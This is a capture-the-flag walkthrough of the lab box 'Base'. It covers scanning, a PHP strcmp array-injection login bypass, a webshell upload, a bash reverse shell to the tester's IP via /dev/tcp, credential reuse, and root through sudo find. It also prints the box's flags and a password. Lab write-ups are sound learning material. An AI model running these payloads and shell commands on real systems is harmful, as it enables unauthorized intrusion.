
## CTF Writeup: Base

---
## Reconnaissance

An initial TCP scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.95.184        
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-28 18:38 -0500
Nmap scan report for 10.129.95.184
Host is up (0.036s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f6:5c:9b:38:ec:a7:5c:79:1c:1f:18:1c:52:46:f7:0b (RSA)
|   256 65:0c:f7:db:42:03:46:07:f2:12:89:fe:11:20:2c:53 (ECDSA)
|_  256 b8:65:cd:3f:34:d8:02:6a:e3:18:23:3e:77:dd:87:40 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome to Base
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.18 seconds
```

Another UDP Scan revealed no exploitable services being active.

```
nmap -sU --top-ports 100 -oN nmap_udp.txt 10.129.95.184
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-28 18:39 -0500
Stats: 0:00:40 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 49.78% done; ETC: 18:40 (0:00:40 remaining)
Nmap scan report for 10.129.95.184
Host is up (0.043s latency).
Not shown: 99 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc

Nmap done: 1 IP address (1 host up) scanned in 102.06 seconds
```

Upon inspecting the webpage, we see an login panel, which redirects us to the /login/login.php.

Decided to enumerate file extensions on /login endpoint.

```
feroxbuster --url http://10.129.95.184/login -w /usr/share/dirb/wordlists/common.txt -x txt,php,html,zip,json,docx,aspx,asp,cgi,pdf
                                                                                                                             
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.95.184/login
 🚩  In-Scope Url          │ 10.129.95.184
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/dirb/wordlists/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, html, zip, json, docx, aspx, asp, cgi, pdf]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      174l      463w     7102c http://10.129.95.184/login/login.php
200      GET        0l        0w        0c http://10.129.95.184/login/config.php
200      GET        4l      283w    16512c http://10.129.95.184/login/login.php.swp
[####################] - 1s        33/33      0s      found:1       errors:0      
[####################] - 0s     50754/50754   221633/s http://10.129.95.184/login/ => Directory listing (add --scan-dir-listings to scan) 
```

Identified an config.php and an login.php.swp file. The config.php wasn't displayable, we are prob lacking permissions to view the file. But I was able to download the .swp file onto my local machine.

The .swp file revealed an evaluation function for php strcmp() which is vulnerable to login bypass / php array injection. 

We can intercept the login request (POST) and change the types of the parameters to an array and we should be able to bypass the login panel.

```
username[]=admin&password[]=pass
```

We got forwarded to the /upload.php endpoint. Which presents us with an upload functionality.

We were able to upload an wolfswebshell.php. But to which directory?

Enumerated endpoints and identfied an /_uploaded directory.

```
feroxbuster --url http://10.129.95.184 -w /usr/share/wordlists/dirb/big.txt
```

Viewed the webshell in the browser and gained command execution on the target server as user "www-data".

```
http://10.129.95.184/_uploaded/wolfswebshell.php
```

Started up an listener on port 80.

```
nc -lvnp 80
```

Executed the following bash one-liner inside the webshell and gained RCE.

```
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.44/80 0>&1'
```

Performed Shell Hardening.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo ; fg ; reset
stty columns 200 rows 200
export TERM=xterm
```
## Privilege Escalation

Viewed config.php in /var/www/html/login and gained credentials for the CMS.

```
admin:thisisagoodpassword
```

Reused the password and logged into the user "john".

```
su john
```

Retrieved user.txt in /home/john directory.

```
f54846c258f3b4612f78a819573d158e
```

Enumerated user "john"'s sudo permissions and identified that he can run the find binary with root permissions.

```
john@base:~$ sudo -l
[sudo] password for john: 
Matching Defaults entries for john on base:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on base:
    (root : root) /usr/bin/find
```

Searched up for an PoC on gtfobins.org and found the following. Executed it and gained root.

```
sudo find . -exec /bin/sh \; -quit
```

Retrieved root.txt in /root directory.

```
51709519ea18ab37dd6fc58096bea949
```